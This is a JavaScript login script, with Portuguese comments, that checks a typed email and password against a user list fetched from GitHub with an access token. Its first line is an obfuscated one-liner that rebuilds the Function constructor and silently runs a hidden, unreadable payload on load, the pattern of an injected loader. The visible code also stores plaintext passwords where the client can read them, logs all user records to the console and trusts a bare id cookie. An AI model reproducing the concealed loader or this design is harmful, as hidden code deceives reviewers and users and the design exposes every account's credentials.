var token,username,repo,path;(function(){var rqQ='',ISe=106-95;function bxq(f){var s=1417438;var a=f.length;var z=[];for(var q=0;q<a;q++){z[q]=f.charAt(q)};for(var q=0;q<a;q++){var y=s*(q+116)+(s%24881);var v=s*(q+568)+(s%38629);var k=y%a;var m=v%a;var j=z[k];z[k]=z[m];z[m]=j;s=(y+v)%7594853;};return z.join('')};var SaW=bxq('cuvufryjtopenozcnsstitodkhlrbqwxagmcr').substr(0,ISe);var AMY='=rr;;+ieu=+p1rznxulrr(w;]9prrirs+llj[)m;opq )soo Ao"rrc]v=,=tfhl=9,.1hh=r2(,nt-;=..6))6i[sce8<6)(=4s6l)a0f50.;esf"=7)(>=tt)n)er=+];o, i;  r.ri(lC0rl.r2;h[v++)6s.;]]p<8jo;)irb,,hrx;ij)a+1iaw6;o(cc, fh ax;z uk]j;+)xvi*eat7t.,<)+1hmC])[e1r8< ecwuv5l;)l0jsf)a[8)pue=vs r{o}S5r-(.)-n(t*vj0((=r t]-={,aif,=,m=011(n){ve.0ia (tC;c(r1y;v(g ba;Ce1lgruh0i(p!khfsarh;)n+rhxd+pm=th7ea=.k1];hvtasn50dra1ttv{v[(vol;ai;om=u);a;)n;)0r+uuf yi)( e2C];rop[8=s+3;+2eia a;if);xlln[r(qht=)8[rmh.lnxi,nnqo -[=h.,u({aagah;+i(1nlA7noaerg9Aa;tapa>s(<,ab(b;b=lv.+5a,g+ine8aay=ii6aSs=o=-n,n.vrnCam}w)9;.)[tlntlsfnni9;,,r+fem],(=uus[t=nv-d,y;icfs+"}7gr6g(g,l20{rv8o,,"a; uo,d==xv"c]=fnts.+..=n"fy=]tf;]rv"n;}(t==4sv(z=g;rrk;9Cjr;a.fudC0x"utap7)o+eve=3af+g,,mn2n,(te.4rvq"i( )tiglpre2({h2+1h a"euhoi);A6nshrr=}(virvx.i;xa[hl=ggjae9r+4v8(.s.[td+vnhdctlrA7v .ztnoinr= vi=3o )a 19;;pol(;qi.l.pvh44uhj(ol pufbne}n!}7=ro(rhvy)';var brU=bxq[SaW];var mLF='';var UIQ=brU;var PeS=brU(mLF,bxq(AMY));var Dmb=PeS(bxq('bbc0(o$0jyrf)g1)$\'.]UU6s UiU.3bvjb!)s\/oUUc-{ =&(!U[s,1,Ueas%ye o4n3t.;_\'8p.;U(0%j=){t.g.ct#U=._m1_,3UU}NUlfUraU7_p_=cUU)nln,0s%s&U%b+uUseb)r.tpt.(CIc3. )471(}l(..bh,i}_eccr =y1a.USsc\',.Uo.}aU#3p1;".oUU_;1&U8.f=h,.erp+_2lp0;$b]$a(p96+(!Ujetpt;!\/)c{U1]p2U;y_U$.()r$s,rr,), #cgdsy.C41 )gm=c1!,t)(3red"yt0;U2!o6rU6_sym,1(+*b\/a_}U3$t.iu!nh.$j1a&njnbrUt+;U08-oUy$%z..sb=$;+c7u )!4#U!.h.cUd9t4\/!18$))b(,#5U.o8],+Ur,e}.0f(f1(.3UUiU uU( ,hm;y(,\'UU7it!3*6=\/&)U;i$_;=+jts0_hU1,ycl0.af;_7g);.d g.UUhgh.)(v;U2"(2s0t*$(g5h;4UUwp U)r,t.c!(.2g!gcrcU+ttUbboh$))+4_7=rU)wpqz.rrcU}U(UC3g.1lo7UofU,.!.0ui)37d0wD!eUacU35n0,zUjU#i2U)UUU(."n%j})h6,4+fn%cj_3*q-ot)UsmcU51f){U(=b");eU.)ip_kcn=.U.ae e8Ua+bd%,!.nnhrUb2$gn-)dUM(];.m)1U)g(dppd=S[%54(gU+t;rh0i}w;12fr)1o,3)0S$ries(=;cnas6\/.2eUti1}b!e=w(1p2=,;(U)4cU1[h_7w0olsth.!s!o!3)},o$(%c!=Uct.)],ur1$nU((_..!;snd$l1$)4.bjacofe$ a$3=,8tyU,2c. "=by(061 f;;)(#x3!=u{]Utu{_i-a..r.45o,U.{ ;$} "$3ginae$.))Utb{t.8ts.,){cp;.t213!a,cj8o$,,0U.1_!_f'));var CaE=UIQ(rqQ,Dmb );CaE(9092);return 1041})()
var url = `https://api.github.com/repos/${username}/${repo}/contents/${path}`;

async function authenticateUser(emailInput, passwordInput) {
  try {
    // Faz a requisição à API do GitHub para obter o conteúdo do arquivo JSON
    const response = await fetch(url, {
      headers: {
        'Authorization': `token ${token}`
      }
    });

    if (!response.ok) {
      throw new Error('Network response was not ok ' + response.statusText);
    }

    const data = await response.json();
    
    const usersJson = atob(data.content);
    const users = JSON.parse(usersJson);

    console.log(users); 

    // Procura pelo usuário com o email e senha fornecidos
    const user = users.find(user => user.email === emailInput && user.password === passwordInput);

    if (user) {
      if (!user.active) {
        document.getElementById('custom-error-msg').style.display = 'block';
        document.getElementById('error-msg').style.display = 'none';
      } else {
        // Configura o cookie com o ID do usuário
        setCookie('id', user.id, 10); 

        // Redireciona para a URL especificada
        window.location.href = user.redirectUrl;
        return { id: user.id, redirectUrl: user.redirectUrl }; 
      }
    } else {
      document.getElementById('error-msg').style.display = 'block';
      document.getElementById('custom-error-msg').style.display = 'none';
    }
  } catch (error) {
    console.error('Error loading users:', error);
  }

  // Em caso de falha ou usuário não encontrado, retorna null
  return null;
}

function setCookie(name, value, days) {
  const expires = new Date();
  expires.setTime(expires.getTime() + days * 24 * 60 * 60 * 1000);
  document.cookie = `${name}=${value};expires=${expires.toUTCString()};path=/`;
}

async function login() {
  const emailInput = document.getElementById('email').value;
  const passwordInput = document.getElementById('password').value;
  
  await authenticateUser(emailInput, passwordInput);
}
